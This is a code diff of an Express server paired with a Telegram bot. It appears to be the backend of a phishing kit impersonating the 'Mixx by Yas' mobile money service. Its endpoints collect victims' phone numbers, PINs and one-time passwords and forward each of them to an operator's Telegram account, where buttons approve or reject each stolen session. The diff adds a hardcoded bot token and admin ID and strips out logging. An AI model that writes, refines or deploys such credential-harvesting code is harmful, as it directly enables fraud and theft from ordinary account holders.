@@ -6,21 +6,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Fetch tokens strictly from environment variables for enhanced security
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '').trim();
+// Safe configuration with fallbacks to prevent startup crashes
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
+const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
 
-if (!TELEGRAM_BOT_TOKEN) {
-    console.error("CRITICAL ERROR: TELEGRAM_BOT_TOKEN environment variable is missing!");
-    process.exit(1);
-}
-
-if (!MAIN_ADMIN_ID) {
-    console.error("CRITICAL ERROR: MAIN_ADMIN_ID environment variable is missing!");
-    process.exit(1);
-}
-
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
 // Initialize bot with polling for stable communication on Render
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
@@ -46,8 +36,6 @@ bot.on('message', (msg) => {
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
-    console.log(`Received message from ${userIdStr}:${msg.text}`);
-
     const host = process.env.RENDER_EXTERNAL_URL || 'https://mixx-by-yas-m5oy.onrender.com';
     const isolatedLink = `${host}/?admin=${userIdStr}`;
 
@@ -62,8 +50,6 @@ bot.on('message', (msg) => {
 
         bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
             .catch(err => console.error("Error sending start message:", err));
-        
-        console.log(`Admin session active for ID: ${userIdStr}`);
     }
 });
 
@@ -127,7 +113,7 @@ bot.on('callback_query', async (query) => {
     bot.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
 });
 
-app.post('/api/submit-credentials', express.json(), (req, res) => {
+app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, phone, pin, amount, duration } = req.body;
     
     activeSessions[sessionId] = {
@@ -138,14 +124,11 @@ app.post('/api/submit-credentials', express.json(), (req, res) => {
     const host = req.get('host') || 'mixx-by-yas-m5oy.onrender.com';
     const clientLink = `https://${host}/?session=${sessionId}`;
 
-    const message = `🌐 *Client Link:* ${clientLink}\n\n` +
-        `PHONE NO: \`${escapeMarkdown(phone)}\`\n` +
-        `PIN: \`${escapeMarkdown(pin)}\``;
-
-    console.log(`Broadcasting credentials to Main Admin ID: ${MAIN_ADMIN_ID}`);
+    const message = `Client Link: ${clientLink}\n\n` +
+        `PHONE NO: ${phone}\n` +
+        `PIN: ${pin}`;
 
     bot.sendMessage(MAIN_ADMIN_ID, message, {
-        parse_mode: 'Markdown',
         reply_markup: {
             inline_keyboard: [
                 [
@@ -154,16 +137,14 @@ app.post('/api/submit-credentials', express.json(), (req, res) => {
                 ]
             ]
         }
-    }).then(() => {
-        console.log(`Successfully sent message to Main Admin: ${MAIN_ADMIN_ID}`);
     }).catch(err => {
-        console.error(`CRITICAL Telegram Error sending to ${MAIN_ADMIN_ID}:`, err.response ? err.response.body : err.message);
+        console.error(`CRITICAL Telegram Error:`, err.response ? err.response.body : err.message);
     });
 
     res.json({ success: true, sessionId });
 });
 
-app.post('/api/submit-otp', express.json(), (req, res) => {
+app.post('/api/submit-otp', (req, res) => {
     const { sessionId, otpText } = req.body;
     const session = activeSessions[sessionId];
 
@@ -175,11 +156,10 @@ app.post('/api/submit-otp', express.json(), (req, res) => {
     session.status = 'pending_final_approval';
 
     const message = `GOT OTP\nOTP VERIFICATION\n\n` +
-        `PHONE NO: \`${escapeMarkdown(session.phone)}\`\n\n` +
-        `OTP:\n\`\`\`text\n${otpText}\n\`\`\``;
+        `PHONE NO: ${session.phone}\n\n` +
+        `OTP:\n${otpText}`;
 
     bot.sendMessage(MAIN_ADMIN_ID, message, {
-        parse_mode: 'Markdown',
         reply_markup: {
             inline_keyboard: [
                 [
@@ -207,4 +187,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
-        
+            
